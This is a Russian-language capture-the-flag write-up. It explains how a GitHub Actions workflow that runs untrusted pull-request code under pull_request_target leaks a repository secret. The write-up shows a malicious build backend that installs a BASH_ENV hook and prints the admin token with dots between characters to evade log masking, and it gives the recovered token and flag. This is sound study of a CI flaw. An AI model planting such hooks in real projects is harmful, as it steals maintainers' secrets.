# KNotes

**Категория:** Misc  
**Стоимость:** 147

> Open Source is great! Or is it?

В задании было приложение для заметок. Внизу страницы лежала ссылка на исходники в Gitea.

## Разбор

Сначала посмотрел сам Flask-код. Флаг сохранялся в приватную заметку, а увидеть её можно было только после ввода `ADMIN_TOKEN` на странице `/admin`:

```python
ADMIN_TOKEN = os.environ.get("ADMIN_TOKEN", "REDACTED")
FLAG = os.environ.get("FLAG", "kaspersky{f4k3_fl4g}")

if hmac.compare_digest(token, ADMIN_TOKEN):
    session["admin_unlocked"] = True
```

В приложении ничего подходящего для обхода этой проверки не нашлось, поэтому стал смотреть остальные файлы репозитория. Интереснее всего оказался workflow `.github/workflows/ci.yml`:

```yaml
on:
  pull_request_target:
    branches: [main]

steps:
  - uses: actions/checkout@df4cb1c069e1874edd31b4311f1884172cec0e10
    with:
      ref: refs/pull/${{ github.event.pull_request.number }}/head

  - name: Sync dependencies
    run: uv sync --offline

  - name: Check for secrets
    env:
      EXPECTED_TOKEN: ${{ secrets.ADMIN_TOKEN }}
```

Здесь используется `pull_request_target`, поэтому job запускается с секретами основного репозитория. При этом checkout явно забирает код из PR, после чего на нём выполняется `uv sync`. Получается, достаточно открыть PR из форка и добиться выполнения своего кода во время сборки Python-пакета.

Я заменил настройку `package = false` на собственный PEP 517 backend:

```toml
[build-system]
requires = []
build-backend = "backend"
backend-path = ["."]
```

В `uv.lock` проект также поменял с `virtual` на `editable`. При импорте backend создаёт shell-hook и добавляет его в `BASH_ENV` через `$GITHUB_ENV`:

```python
HOOK.write_text(
    '#!/usr/bin/env bash\n'
    'if [[ -n "${EXPECTED_TOKEN:-}" ]]; then\n'
    '  printf "KNOTES_ADMIN_TOKEN_DOTTED="\n'
    '  for ((i=0; i<${#EXPECTED_TOKEN}; i++)); do\n'
    '    printf "%s." "${EXPECTED_TOKEN:i:1}"\n'
    '  done\n'
    '  printf "\\n"\n'
    'fi\n'
)

with open(os.environ["GITHUB_ENV"], "a") as f:
    f.write(f"BASH_ENV={HOOK}\n")
```

Сам `ADMIN_TOKEN` появляется только в следующем шаге workflow. Но каждый bash-процесс перед запуском читает файл из `BASH_ENV`, поэтому hook выполняется уже тогда, когда `EXPECTED_TOKEN` есть в окружении.

Обычный вывод токена и даже base64 в логах заменялся на `***`. Обошёл маскирование простым разделителем после каждого символа:

```text
KNOTES_ADMIN_TOKEN_DOTTED=b.2.0.2.2.f.7.5.c.3.4.c.9.9.9.9.c.d.5.2.4.f.a.8.e.6.0.8.7.8.b.7.
```

После удаления точек получился токен:

```text
b2022f75c34c9999cd524fa8e60878b7
```

Ввёл его на `/admin` и в приватной заметке лежал флаг. Полный backend для PR находится в [backend.py](backend.py).

## Флаг

```text
kaspersky{e2c0a7c7-95f1-41bb-8dc9-de52700c59c3}
```


